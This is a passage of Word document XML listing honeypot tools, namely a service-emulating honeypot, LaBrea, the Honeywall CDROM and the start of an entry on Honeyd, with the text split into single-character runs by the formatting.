        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng serv</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>es. I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>ary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>purp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">se </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o dec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ve hu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>an a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ackers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="1" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="198"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LaB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ea :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s des</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ow down or s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>op a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:t>acks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>by ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>as a s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>cky</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>o d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ect and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>rap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">her </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ous</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>codes. It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>run on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ndo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>s or Un</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="19" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="68"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>3.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oneywa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:t>oneywa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t>DROM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a boo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>CD</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">open </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ource</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sof</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ware.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">It </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>akes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeynet</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>dep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>fec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>by</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>au</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>process</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of dep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a honeynet</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ga</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>eway</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>kn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>wn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>as</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a Honeywa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>It can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ure,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>rol</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ana</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>yse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">l </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nbound and ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">bound </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeynet</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="19" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="72"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>4.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oneyd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
